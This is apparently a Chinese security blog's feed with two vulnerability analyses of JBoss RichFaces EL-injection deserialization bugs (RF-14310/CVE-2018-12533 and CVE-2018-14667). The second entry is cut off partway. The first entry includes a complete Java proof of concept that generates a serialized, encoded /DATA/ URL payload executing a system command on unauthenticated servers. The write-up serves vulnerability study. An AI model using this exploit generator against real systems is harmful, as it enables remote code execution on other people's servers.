    <content type="html"><![CDATA[<p>RF-14310，另一个RichFaces的漏洞，利用面要比CVE-14667广。</p><a id="more"></a><h1 id="0x00-漏洞概述"><a href="#0x00-漏洞概述" class="headerlink" title="0x00 漏洞概述"></a>0x00 漏洞概述</h1><blockquote><p>JBoss RichFaces 3.1.0 through 3.3.4 allows unauthenticated remote attackers to inject expression language (EL) expressions and execute arbitrary Java code via a /DATA/ substring in a path with an org.richfaces.renderkit.html.Paint2DResource$ImageData object, aka RF-14310.</p></blockquote><p>根据漏洞描述，可以知道漏洞可以通过<code>org.richfaces.renderkit.html.Paint2DResource$ImageData</code>对象注入EL表达式来完成远程任意代码执行的漏洞。</p><h1 id="0x01-整体触发流程"><a href="#0x01-整体触发流程" class="headerlink" title="0x01 整体触发流程"></a>0x01 整体触发流程</h1><p>这个漏洞是在CVE-2018-14667之前爆出的，CVE-2018-14667的触发流程和其非常相似所以只谈几个较为重要的点。</p><p>总体来说这个洞还是出现在<code>RichFaces</code>资源加载的地方，可以说14667是这个漏洞的另一种利用方式。</p><p>当一个资源请求被调用时就会调用<code>org.ajax4jsf.resource.ResourceLifecycle</code>类，而在该类中实现资源发送的方法是<code>send</code>，在<code>send</code>中主要的功能由<code>sendResource</code>方法实现，而在<code>sendResource</code>又存在一个关键性的<code>send</code>方法：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/12/05/15439093924444.jpg" alt=""></p><p><img src="http://image-lucifaer.test.upcdn.net/2018/12/05/15439095243976.jpg" alt=""></p><p><img src="http://image-lucifaer.test.upcdn.net/2018/12/05/15439095424728.jpg" alt=""></p><p>我们看一下<code>send</code>方法的继承类：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/12/05/15439097913093.jpg" alt=""></p><p>在CVE-2018-14667中可以使用<code>UserResource</code>的<code>send</code>触发点来执行EL表达式，而在RF-14310中是利用<code>Paint2DResource</code>来执行EL表达式的。</p><h1 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h1><p>重复的反序列化那一部分就不再赘述，主要看触发流程。</p><h2 id="2-1-反序列化流程"><a href="#2-1-反序列化流程" class="headerlink" title="2.1 反序列化流程"></a>2.1 反序列化流程</h2><p>根据0x01中的继承关系，我们直接看漏洞触发点<code>Paint2DResource</code>这个类的<code>send</code>方法：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/12/05/15439761586162.jpg" alt=""></p><p>可以看到这里的<code>ImageData</code>同样来自于<code>restoreData</code>这个方法，而这个方法同样是利用<code>getResourceData</code>来从<code>resourceData</code>映射中获取资源，而<code>setResourceData</code>的过程同样在<code>org.ajax4jsf.resource.InternetResourceService$serviceResource</code>中。</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/12/05/15439764146996.jpg" alt=""></p><p>所以反序列化流程是和CVE-2018-14667相同的。</p><h2 id="2-2-EL执行点"><a href="#2-2-EL执行点" class="headerlink" title="2.2 EL执行点"></a>2.2 EL执行点</h2><p>跟进<code>MethodBinding</code>的<code>invoke</code>方法：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/12/05/15439766004203.jpg" alt=""></p><p>可以看到在<code>MethodBinding</code>调用<code>invoke</code>之前，<code>MethodBinding</code>就已经执行了EL表达式。也就是说可以在<code>ImageData</code>的<code>_paint</code>属性中加入我们的EL表达式，下个断点来证明我们的想法：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/12/05/15439771951301.jpg" alt=""></p><p>值得注意的是，在构造poc时，需要使用<code>MethodExpression</code>的对象，这就意味着需要附加一个针对不同Tomcat版本的ssid(serialVersionUID)。</p><h2 id="2-3-触发流程"><a href="#2-3-触发流程" class="headerlink" title="2.3 触发流程"></a>2.3 触发流程</h2><p>就像0x01中所说的一样，在加载资源类时都会调用，和CVE-2018-14667不同的是，RF-14310利用时并不需要资源对象为缓存类对象，同时对于资源请求的标签没有限制，没有要求<code>InternetResource</code>必须为<code>userResource</code>：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/12/05/15439777562030.jpg" alt=""></p><p>所以说可以直接发包调用资源触发漏洞。</p><h1 id="0x03-构造POC"><a href="#0x03-构造POC" class="headerlink" title="0x03 构造POC"></a>0x03 构造POC</h1><p>和CVE-2018-14667相同的部分就不重复说了，以下就谈一下写这个POC需要注意的几个点。</p><h2 id="3-1-suid（serialVersionUID）的限制"><a href="#3-1-suid（serialVersionUID）的限制" class="headerlink" title="3.1 suid（serialVersionUID）的限制"></a>3.1 <code>suid</code>（serialVersionUID）的限制</h2><p><code>suid</code>的主要作用简单来说就是保证序列化对象与反序列化对象的一致性，<strong>在richfaces中是调用<code>javax.el.*</code>来实现的，而不是调用lib中的<code>org.jboss.el.*</code></strong>来实现的，所以在写poc时最好利用反射把<code>javax.el.MethodExpression</code>中的<code>serialVersionUID</code>重写一下，保证在面对不同容器版本时设置不同的<code>serialVersionUID</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// tomcat8.5.24 MethodExpression serialVersionUID</span></span><br><span class="line">Long MethodExpressionSerialVersionUID = <span class="number">8163925562047324656L</span>;</span><br><span class="line">Class clazz = Class.forName(<span class="string">"javax.el.MethodExpression"</span>);</span><br><span class="line">Field field = clazz.getField(<span class="string">"serialVersionUID"</span>);</span><br><span class="line">field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">Field modifiersField = Field.class.getDeclaredField(<span class="string">"modifiers"</span>);</span><br><span class="line">modifiersField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">modifiersField.setInt(field, field.getModifiers() &amp; ~Modifier.FINAL);</span><br><span class="line">field.setLong(<span class="keyword">null</span>, MethodExpressionSerialVersionUID);</span><br></pre></td></tr></table></figure><p>当然也可以手动导入不同版本容器的<code>el-api.jar</code>来实现。</p><h2 id="3-2-选择合适的利用链"><a href="#3-2-选择合适的利用链" class="headerlink" title="3.2 选择合适的利用链"></a>3.2 选择合适的利用链</h2><p>我根据CVE-2018-14667的poc选择了：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">javax.faces.component.StateHolderSaver</span><br><span class="line">    com.sun.facelets.el.LegacyMethodBinding</span><br><span class="line">        com.sun.facelets.el.TagMethodExpression</span><br><span class="line">            com.sun.facelets.tag.TagAttribute</span><br><span class="line">            org.jboss.el.MethodExpressionImpl</span><br><span class="line">                expr = poc</span><br></pre></td></tr></table></figure><p>这个是我觉得最简单的一个利用链了，当然在<code>LegacyMethodBinding</code>可以换成除了<code>ConstantMethodBinding</code>和<code>SimpleActionMethodBinding</code>的任意一个。</p><h2 id="3-3-利用反射给private-static-final对象赋值"><a href="#3-3-利用反射给private-static-final对象赋值" class="headerlink" title="3.3 利用反射给private static final对象赋值"></a>3.3 利用反射给<code>private static final</code>对象赋值</h2><p>其实问题的关键点在于如何利用反射去给</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">public</span> <span class="title">class</span> <span class="title">Paint2DResource</span> <span class="keyword">extends</span> <span class="title">InternetResourceBase</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">ImageData</span> <span class="keyword">implements</span> <span class="title">SerializableResource</span></span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样的类型赋值，同时要注意到<code>private static final class ImageData</code>是没有无参，无构造函数的私有类，所以没有办法直接通过<code>getDeclaredClass()</code>直接获取。方法就是首先反射创建<code>Paint2DResource</code>对象：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Class clzz = Class.forName(<span class="string">"org.richfaces.renderkit.html.Paint2DResource"</span>);</span><br><span class="line">Class innerClazz[] = clzz.getDeclaredClasses();</span><br></pre></td></tr></table></figure><p>这里的<code>getDeclaredClasses</code>返回<code>Paint2DResource</code>的所有构造器，之后遍历该对象中所有的构造器找到构造器名称中带有<code>private</code>的构造器，然后进行赋值操作：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (Class c : innerClazz)&#123;</span><br><span class="line">    <span class="keyword">int</span> mod = c.getModifiers();</span><br><span class="line">    String modifier = Modifier.toString(mod);</span><br><span class="line">    <span class="keyword">if</span> (modifier.contains(<span class="string">"private"</span>))&#123;</span><br><span class="line">        Constructor cc = c.getDeclaredConstructor();</span><br><span class="line">        cc.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        Object imageData = cc.newInstance(<span class="keyword">null</span>);</span><br><span class="line">        Field _widthField = imageData.getClass().getDeclaredField(<span class="string">"_width"</span>);</span><br><span class="line">        _widthField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        _widthField.set(imageData, <span class="number">300</span>);</span><br></pre></td></tr></table></figure><p>这里需要注意<code>c.getDeclaredConstructor()</code>参数应为空说明获得的是一个无参的构造器，而<code>cc.newInstance(null)</code>参数为<code>null</code>说明实例化的是一个无构造函数的对象。</p><h2 id="完整版POC"><a href="#完整版POC" class="headerlink" title="完整版POC"></a>完整版POC</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.facelets.el.LegacyMethodBinding;</span><br><span class="line"><span class="keyword">import</span> com.sun.facelets.el.TagMethodExpression;</span><br><span class="line"><span class="keyword">import</span> com.sun.facelets.tag.TagAttribute;</span><br><span class="line"><span class="keyword">import</span> com.sun.facelets.tag.Location;</span><br><span class="line"><span class="keyword">import</span> org.ajax4jsf.util.base64.URL64Codec;</span><br><span class="line"><span class="keyword">import</span> org.jboss.el.MethodExpressionImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.faces.context.FacesContext;</span><br><span class="line"><span class="keyword">import</span> javax.faces.el.MethodBinding;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.OutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Modifier;</span><br><span class="line"><span class="keyword">import</span> java.util.zip.Deflater;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CVE_2018_12533</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        String pocEL = <span class="string">"#&#123;request.getClass().getClassLoader().loadClass(\"java.lang.Runtime\").getMethod(\"getRuntime\").invoke(null).exec(\"open /Applications/Calculator.app\")&#125;"</span>;</span><br><span class="line">        <span class="comment">// 根据文章https://www.anquanke.com/post/id/160338</span></span><br><span class="line">        Class cls = Class.forName(<span class="string">"javax.faces.component.StateHolderSaver"</span>);</span><br><span class="line">        Constructor ct = cls.getDeclaredConstructor(FacesContext.class, Object.class);</span><br><span class="line">        ct.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">        Location location = <span class="keyword">new</span> Location(<span class="string">""</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">        TagAttribute tagAttribute = <span class="keyword">new</span> TagAttribute(location, <span class="string">""</span>, <span class="string">""</span>, <span class="string">""</span>, <span class="string">"createContent="</span>+pocEL);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 1. 设置ImageData</span></span><br><span class="line">        <span class="comment">//    构造ImageData_paint</span></span><br><span class="line">        MethodExpressionImpl methodExpression = <span class="keyword">new</span> MethodExpressionImpl(pocEL, <span class="keyword">null</span>, <span class="keyword">null</span>, <span class="keyword">null</span>, <span class="keyword">null</span>, <span class="keyword">new</span> Class[]&#123;OutputStream.class, Object.class&#125;);</span><br><span class="line">        TagMethodExpression tagMethodExpression = <span class="keyword">new</span> TagMethodExpression(tagAttribute, methodExpression);</span><br><span class="line">        MethodBinding methodBinding = <span class="keyword">new</span> LegacyMethodBinding(tagMethodExpression);</span><br><span class="line">        Object _paint = ct.newInstance(<span class="keyword">null</span>, methodBinding);</span><br><span class="line"></span><br><span class="line">        Class clzz = Class.forName(<span class="string">"org.richfaces.renderkit.html.Paint2DResource"</span>);</span><br><span class="line">        Class innerClazz[] = clzz.getDeclaredClasses();</span><br><span class="line">        <span class="keyword">for</span> (Class c : innerClazz)&#123;</span><br><span class="line">            <span class="keyword">int</span> mod = c.getModifiers();</span><br><span class="line">            String modifier = Modifier.toString(mod);</span><br><span class="line">            <span class="keyword">if</span> (modifier.contains(<span class="string">"private"</span>))&#123;</span><br><span class="line">                Constructor cc = c.getDeclaredConstructor();</span><br><span class="line">                cc.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                Object imageData = cc.newInstance(<span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">                <span class="comment">//    设置ImageData_width</span></span><br><span class="line">                Field _widthField = imageData.getClass().getDeclaredField(<span class="string">"_width"</span>);</span><br><span class="line">                _widthField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                _widthField.set(imageData, <span class="number">300</span>);</span><br><span class="line"></span><br><span class="line">                <span class="comment">//    设置ImageData_height</span></span><br><span class="line">                Field _heightField = imageData.getClass().getDeclaredField(<span class="string">"_height"</span>);</span><br><span class="line">                _heightField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                _heightField.set(imageData, <span class="number">120</span>);</span><br><span class="line"></span><br><span class="line">                <span class="comment">//    设置ImageData_data</span></span><br><span class="line">                Field _dataField = imageData.getClass().getDeclaredField(<span class="string">"_data"</span>);</span><br><span class="line">                _dataField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                _dataField.set(imageData, <span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">                <span class="comment">//    设置ImageData_format</span></span><br><span class="line">                Field _formatField = imageData.getClass().getDeclaredField(<span class="string">"_format"</span>);</span><br><span class="line">                _formatField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                _formatField.set(imageData, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">                <span class="comment">//    设置ImageData_paint</span></span><br><span class="line">                Field _paintField = imageData.getClass().getDeclaredField(<span class="string">"_paint"</span>);</span><br><span class="line">                _paintField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                _paintField.set(imageData, _paint);</span><br><span class="line"></span><br><span class="line">                <span class="comment">//    设置ImageData_paint</span></span><br><span class="line">                Field cacheableField = imageData.getClass().getDeclaredField(<span class="string">"cacheable"</span>);</span><br><span class="line">                cacheableField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                cacheableField.set(imageData, <span class="keyword">false</span>);</span><br><span class="line"></span><br><span class="line">                <span class="comment">//    设置ImageData_bgColor</span></span><br><span class="line">                Field _bgColorField = imageData.getClass().getDeclaredField(<span class="string">"_bgColor"</span>);</span><br><span class="line">                _bgColorField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                _bgColorField.set(imageData, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 2. 序列化</span></span><br><span class="line">                ByteArrayOutputStream byteArrayOutputStream = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">                ObjectOutputStream objectOutputStream = <span class="keyword">new</span> ObjectOutputStream(byteArrayOutputStream);</span><br><span class="line">                objectOutputStream.writeObject(imageData);</span><br><span class="line">                objectOutputStream.flush();</span><br><span class="line">                objectOutputStream.close();</span><br><span class="line">                byteArrayOutputStream.close();</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 3. 加密（zip+base64）</span></span><br><span class="line">                <span class="keyword">byte</span>[] pocData = byteArrayOutputStream.toByteArray();</span><br><span class="line">                Deflater compressor = <span class="keyword">new</span> Deflater(<span class="number">1</span>);</span><br><span class="line">                <span class="keyword">byte</span>[] compressed = <span class="keyword">new</span> <span class="keyword">byte</span>[pocData.length + <span class="number">100</span>];</span><br><span class="line">                compressor.setInput(pocData);</span><br><span class="line">                compressor.finish();</span><br><span class="line">                <span class="keyword">int</span> totalOut = compressor.deflate(compressed);</span><br><span class="line">                <span class="keyword">byte</span>[] zipsrc = <span class="keyword">new</span> <span class="keyword">byte</span>[totalOut];</span><br><span class="line">                System.arraycopy(compressed, <span class="number">0</span>, zipsrc, <span class="number">0</span>, totalOut);</span><br><span class="line">                compressor.end();</span><br><span class="line">                <span class="keyword">byte</span>[]dataArray = URL64Codec.encodeBase64(zipsrc);</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 4. 打印最后的poc</span></span><br><span class="line">                String poc = <span class="string">"/DATA/"</span> + <span class="keyword">new</span> String(dataArray, <span class="string">"ISO-8859-1"</span>) + <span class="string">".jsf"</span>;</span><br><span class="line">                System.out.println(poc);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>效果：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/12/05/15439950217838.jpg" alt="-w1279"></p><h1 id="0x04-Reference"><a href="#0x04-Reference" class="headerlink" title="0x04 Reference"></a>0x04 Reference</h1><ul><li><a href="https://access.redhat.com/security/cve/cve-2018-12533" target="_blank" rel="noopener">https://access.redhat.com/security/cve/cve-2018-12533</a></li><li><a href="https://dzone.com/articles/what-is-serialversionuid" target="_blank" rel="noopener">https://dzone.com/articles/what-is-serialversionuid</a></li><li><a href="https://docs.oracle.com/javaee/6/tutorial/doc/bnahu.html" target="_blank" rel="noopener">https://docs.oracle.com/javaee/6/tutorial/doc/bnahu.html</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;RF-14310，另一个RichFaces的漏洞，利用面要比CVE-14667广。&lt;/p&gt;
    
    </summary>
    
      <category term="漏洞分析" scheme="https://lucifaer.com/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
      <category term="漏洞分析" scheme="https://lucifaer.com/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
      <category term="Java" scheme="https://lucifaer.com/tags/Java/"/>
    
      <category term="RichFaces" scheme="https://lucifaer.com/tags/RichFaces/"/>
    
  </entry>
  
  <entry>
    <title>JBoss RichFaces Unserialize+EL=RCE Analysis（CVE-2018-14667）</title>
    <link href="https://lucifaer.com/2018/11/29/JBoss%20RichFaces%20Unserialize+EL=RCE%20Analysis%EF%BC%88CVE-2018-14667%EF%BC%89/"/>
    <id>https://lucifaer.com/2018/11/29/JBoss RichFaces Unserialize+EL=RCE Analysis（CVE-2018-14667）/</id>
    <published>2018-11-29T09:01:00.000Z</published>
    <updated>2018-12-12T08:38:17.000Z</updated>
    
    <content type="html"><![CDATA[<p>刚开始分析Java的漏洞，很多东西感觉还是有待学习…</p><a id="more"></a><h1 id="0x00-漏洞描述"><a href="#0x00-漏洞描述" class="headerlink" title="0x00 漏洞描述"></a>0x00 漏洞描述</h1><blockquote><p>The RichFaces Framework 3.X through 3.3.4 is vulnerable to Expression Language (EL) injection via the UserResource resource. A remote, unauthenticated attacker could exploit this to execute arbitrary code using a chain of java serialized objects via org.ajax4jsf.resource.UserResource$UriData.</p></blockquote><p>根据漏洞描述，可以得知是通过<code>UserResource</code>注入EL表达式而造成的rce。而未经身份验证的攻击者可以通过<code>org.ajax4jsf.resource.UserResource$UriData</code>的反序列化利用链，完成rce。</p><h1 id="0x01-整体触发流程"><a href="#0x01-整体触发流程" class="headerlink" title="0x01 整体触发流程"></a>0x01 整体触发流程</h1><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">MediaOutputRenderer$doEncodeBegin:<span class="number">54</span> </span><br><span class="line"># 触发createUserResource方法，将序列化内容写到Map映射中</span><br><span class="line">BaseFilter$doFilter</span><br><span class="line">  InternetResourceService$serviceResource:101 # 根据resourceKey获取资源</span><br><span class="line">    ResourceBuilderImpl$getResourceForKey:217 # 从Map映射中利用键值获取序列化内容</span><br><span class="line">  InternetResourceService$serviceResource:106 # 根据resourceKey获取资源</span><br><span class="line">    ResourceBuilderImpl$getResourceDataForKey:227 # 白名单过滤，反序列化</span><br><span class="line">  InternetResourceService$serviceResource:115 # 触发反序列化方法</span><br><span class="line">    UserResource$getLastModified:73 # 可被触发的反序列化方法之一</span><br><span class="line">        ValueExpression$getValue:4 # 执行el表达式</span><br></pre></td></tr></table></figure><h1 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h1><h2 id="2-1-UserResource"><a href="#2-1-UserResource" class="headerlink" title="2.1 UserResource"></a>2.1 UserResource</h2><p>官方给的描述是通过<code>UserResource</code>类进行EL表达式注入的，全局搜一下<code>UserResource</code>这个类，定位到<code>org.ajax4jsf.resource.UserResource</code>。同样官方说可以用<code>UriData</code>进行反序列化利用链的构造，简单看了一下，需要注意的以下三个方法：</p><ul><li><code>send()</code></li><li><code>getLastModified()</code></li><li><code>getExpired()</code></li></ul><p>以上三个方法流程大致相同，挑了<code>getLastModified</code>跟一下：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15428852833815.jpg" alt=""></p><p>可以看出能利用<code>UriData</code>执行<code>EL</code>表达式。跟一下<code>UriData</code>是从哪里来的：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15428853866092.jpg" alt=""></p><p>无论怎样最后会获得一个对象，继续跟一下：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15428854805708.jpg" alt=""></p><p>getter/setter方法获值，跟进一下是什么地方赋值的，在<code>org.ajax4jsf.resource.ResourceContext$serviceResource</code></p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15428856471020.jpg" alt=""></p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15428860245711.jpg" alt=""></p><p>可以清楚的看出，在</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">resourceContext.setResourceData(resourceDataForKey);</span><br></pre></td></tr></table></figure><p>这里完成了set方法。我们现在跟一下上面的流成，看看<code>resourceContext</code>具体是一个什么东西。</p><h2 id="2-2-InternetResourceService"><a href="#2-2-InternetResourceService" class="headerlink" title="2.2 InternetResourceService"></a>2.2 InternetResourceService</h2><p>首先跟一下<code>getResourceDataForKey</code>:</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15428862358196.jpg" alt=""></p><p>根据继承关系可以看到是在<code>ResourceBuilderImpl</code>中实现的：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15428864830056.jpg" alt=""></p><p>首先对<code>resourceDataForKey</code>进行了字符串截取，之后将字符串进行解密，最后调用了<code>LookAheadObjectInputStream</code>，我们跟一下这个类有什么作用：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15428866292918.jpg" alt=""></p><p>可以看到这个类重写了<code>resolveClass</code>方法，也就是说在加载过程中会调用到这个resolveClass方法，并连接到指定的类。在其中有一个<code>this.isClassValid(desc.getName())</code>实现了白名单检测：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15428868689189.jpg" alt=""></p><p>可以看到调用了<code>class.isAssignableFrom</code>校验反序列化的类，也就是说如果反序列化的类是白名单中类的子类或者接口是可以通过该项校验的。向下看一下，可以发现<code>whitelistBaseClasses</code>是从<code>resource-serialization.properties</code>中加载的：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15429427438957.jpg" alt=""></p><p>而<code>UserResource</code>恰好是<code>InternetResource</code>的子类，<code>UserResource$UriData</code>是<code>SerializableResource</code>的子类：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15429429936952.jpg" alt=""></p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15429430049631.jpg" alt=""></p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15429430169919.jpg" alt=""></p><p>所以满足反序列化白名单的要求。</p><p>反过头来看一下之前的字符串解密过程：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15429435113686.jpg" alt=""></p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15429435343365.jpg" alt=""></p><p><code>Coded</code>中的<code>d</code>为<code>null</code>，也就是说这个解密过程为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">base64decode -&gt; zip解密</span><br></pre></td></tr></table></figure><p>现在反序列化流程是我们可以控制的，我们回头看一下组成<code>resourceContext</code>的另一部分<code>resource</code>的生成过程：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15429439065660.jpg" alt=""></p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15429439262635.jpg" alt=""></p><p>首先对url进行了截取，之后通过键值关系在Map映射中获取资源。看一下在哪里对Map进行的填充：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15429443009097.jpg" alt=""></p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15429444021912.jpg" alt=""></p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15429444317113.jpg" alt=""></p><p>可以看到首先根据生成的path去获取<code>userResource</code>，获取不到的话就new一个，然后加入到<code>resources Map</code>中，也就是说只要我们找到哪里调用了<code>createUserResource</code>就可以控制<code>source</code>的值。</p><p>查看<code>createUserResource</code>的调用点时发现只有<code>MediaOutputRenderer$doEncodeBegin</code>调用了该方法。</p><h2 id="2-3-MediaOutputRenderer"><a href="#2-3-MediaOutputRenderer" class="headerlink" title="2.3 MediaOutputRenderer"></a>2.3 MediaOutputRenderer</h2><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15430325852196.jpg" alt=""></p><p>看一下<code>MediaOutputRenderer</code>的处理逻辑，首先创建了<code>userResource</code>，然后调用了getter的方法获取<code>userResource</code>的<code>Uri</code>，之后将<code>Uri</code>放到了<code>ResponseWriter</code>中，我们看一下最后这个<code>ResponseWriter</code>最后干了什么：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15430337246992.jpg" 